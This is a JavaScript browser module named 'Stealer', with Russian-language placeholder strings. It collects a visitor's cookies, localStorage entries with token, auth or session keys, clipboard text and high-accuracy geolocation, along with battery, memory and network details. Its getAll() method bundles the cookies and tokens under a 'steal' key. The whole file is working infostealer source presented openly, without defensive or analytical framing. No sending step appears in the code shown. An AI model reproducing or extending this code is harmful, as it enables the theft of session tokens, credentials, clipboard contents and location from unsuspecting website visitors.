// ==== file: stealer.js ====
// language: JavaScript, target: browser
export const Stealer = {
    data: { cookies: [], storage: [], clipboard: '', geo: null, battery: 'Скрыто', memory: 'Скрыто', network: 'Неизвестно' },

    init() {
        this.grabCookies();
        this.grabStorage();
        this.grabBattery();
        this.grabNetwork();
        this.grabGeo();
    },

    grabCookies() {
        try {
            document.cookie.split(';').forEach(c => {
                const [name, ...val] = c.split('=');
                if (name && val.length) this.data.cookies.push({ name: name.trim(), value: val.join('=') });
            });
        } catch (e) {}
    },

    grabStorage() {
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const k = localStorage.key(i);
                if (k.includes('token') || k.includes('auth') || k.includes('session')) {
                    this.data.storage.push({ name: 'LS:' + k, value: localStorage.getItem(k) });
                }
            }
        } catch (e) {}
    },

    async grabBattery() {
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                this.data.battery = Math.round(b.level * 100) + '%';
            }
        } catch (e) {}
    },

    grabNetwork() {
        try {
            if (navigator.deviceMemory) this.data.memory = navigator.deviceMemory + ' GB';
            if (navigator.connection) this.data.network = navigator.connection.effectiveType || 'Неизвестно';
        } catch (e) {}
    },

    grabGeo() {
        try {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => { this.data.geo = p.coords.latitude + ',' + p.coords.longitude; },
                    () => {},
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            }
        } catch (e) {}
    },

    async grabClipboard() {
        try {
            if (navigator.clipboard) {
                const text = await navigator.clipboard.readText();
                if (text) this.data.clipboard = text;
            }
        } catch (e) {}
    },

    getAll() {
        return {
            steal: [...this.data.cookies, ...this.data.storage],
            clipboard: this.data.clipboard,
            geo: this.data.geo,
            battery: this.data.battery,
            memory: this.data.memory,
            network: this.data.network
        };
    }
};
